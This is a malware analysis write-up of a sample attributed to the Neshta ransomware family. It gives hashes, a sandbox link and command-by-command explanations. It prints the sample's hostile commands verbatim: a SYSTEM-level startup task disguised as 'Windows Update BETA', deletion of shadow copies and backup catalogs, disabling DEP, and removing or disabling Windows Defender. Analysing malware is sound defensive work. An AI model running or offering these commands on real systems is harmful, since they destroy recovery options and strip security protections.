# Neshta Ransomware family

* [https://app.any.run/tasks/990b6a36-241d-4998-8272-ba6c273aa15c/](https://app.any.run/tasks/990b6a36-241d-4998-8272-ba6c273aa15c/)

## History

The ransomware Neshta was first discovered in 2007. It was designed to encrypt files on infected computer systems and demand a ransom in exchange for the decryption key. Neshta primarily spread through malicious emails, compromised software downloads, and other infection methods. Since its discovery, it has been one of many examples of ransomware that have caused disruptions and computer security issues worldwide.

## Sample Information

| Information       | Value                                         |
|-------------------|-----------------------------------------------|
| Analysis date     | December 17, 2023 at 07:20:45                 |
| OS                | Windows 10 Professional (build: 19044, 64 bit)|
| Tags              | ransomware                                    |
| File info         | PE32 executable (GUI) Intel 80386, for MS Windows |
| MD5               | BD3421CDFEA65D7037533121A4B82AEA              |
| SHA256            | 0E5C298EEA81721D30202057A8F1B6EEE18A1BFBB102248F1E862A96128097B9 |


## Setup

### Replication

![create-diectory](/images/neshta/neshta-01.png)
![create-diectory](/images/neshta/neshta-02.png)

### Create Tasl
The command you've provided is used to create a scheduled task in Windows. Here's a breakdown of its components:

```
cmd "/c SCHTASKS.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /sc onstart /TN \"Windows Update BETA\" /TR \"C:\\Users\\Admin\\AppData\\Local\\Temp\\3582-490\\Windows Servers Runtime.exe\" /F"
```

-   `cmd "/c`: This initiates the execution of the command that follows it. `/c` tells the command prompt to execute the command and then terminate.
    
-   `SCHTASKS.exe /Create`: This command is used to create a scheduled task. `SCHTASKS` is the command-line utility for managing Windows scheduled tasks.
    
-   `/RU "NT AUTHORITY\\SYSTEM"`: This specifies the user account under which the scheduled task will run. In this case, it's set to run under the `SYSTEM` account, which has high-level privileges on the local system.
    
-   `/sc onstart`: This sets the schedule type for the task. `onstart` means the task will run each time the computer starts.
    
-   `/TN "Windows Update BETA"`: This sets the name of the task to "Windows Update BETA".
    
-   `/TR "C:\\Users\\Admin\\AppData\\Local\\Temp\\3582-490\\Windows Servers Runtime.exe"`: This is the action to be performed by the scheduled task. Here, it's set to execute a file named `Windows Servers Runtime.exe` located in a temporary folder within the Admin user's AppData directory.
    
-   `/F`: This forces the task to be created and overwrites any existing task with the same name.
    

**Implications:**

-   The use of the `SYSTEM` account suggests that the task will have extensive privileges on the computer.
-   The executable is located in a temporary folder and not in a typical program directory, which could be suspicious.
-   Naming the task "Windows Update BETA" might be an attempt to disguise its true purpose.

Given these factors, especially the location of the executable and the high privileges, this command could potentially be used for malicious purposes, such as running malware at system startup. It's important to be cautious with such commands, and they should only be used if you trust the source of the executable and understand the command's purpose.

### Disable some moyens de protections

cmd.exe "/c vssadmin.exe delete shadows /all /quiet&&wbadmin delete catalog -quiet && bcdedit.exe /set {current} nx AlwaysOff && wmic SHADOWCOPY DELETE"

cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"%s\" "

cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Remove-WindowsFeature Windows-Defender&&powershell -inputformat none -outputformat none -NonInteractive -Command Windows-Defender-GUI&&powershell -inputformat none -outputformat none -NonInteractive -Command New-ItemProperty -Path \"HKLM:SOFTWAREPoliciesMicrosoftWindows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force "

cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled&&powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $true "


1.  **vssadmin, wbadmin, bcdedit, and wmic command**: `cmd.exe "/c vssadmin.exe delete shadows /all /quiet&&wbadmin delete catalog -quiet && bcdedit.exe /set {current} nx AlwaysOff && wmic SHADOWCOPY DELETE"`
    
    -   `vssadmin.exe delete shadows /all /quiet`: Deletes all system restore points (Shadow Copies) without displaying messages.
    -   `wbadmin delete catalog -quiet`: Deletes the backup catalog, which can prevent previous backups from being restored.
    -   `bcdedit.exe /set {current} nx AlwaysOff`: Disables Data Execution Prevention (DEP) for the current system, potentially making the system more vulnerable to attacks.
    -   `wmic SHADOWCOPY DELETE`: Also deletes shadow copies, another form of restore points.
2.  **Add-MpPreference command (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"%s\" "`
    
    -   Adds an exclusion in Windows Defender for a specific path (replaced by `%s`), meaning files in this path will not be scanned by Windows Defender.
3.  **Remove-WindowsFeature, New-ItemProperty commands (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Remove-WindowsFeature Windows-Defender&&powershell -inputformat none -outputformat none -NonInteractive -Command Windows-Defender-GUI&&powershell -inputformat none -outputformat none -NonInteractive -Command New-ItemProperty -Path \"HKLM:SOFTWAREPoliciesMicrosoftWindows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force "`
    
    -   Disables and removes Windows Defender (Windows' built-in antivirus) along with its graphical interface.
    -   Modifies the registry to disable Windows Defender's antispyware feature.
4.  **Get-Service, Stop-Service, Set-Service, Set-MpPreference commands (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled&&powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $true "`
    
    -   Stops the Windows Defender service (WinDefend), disables it at startup, and turns off Windows Defender's real-time monitoring.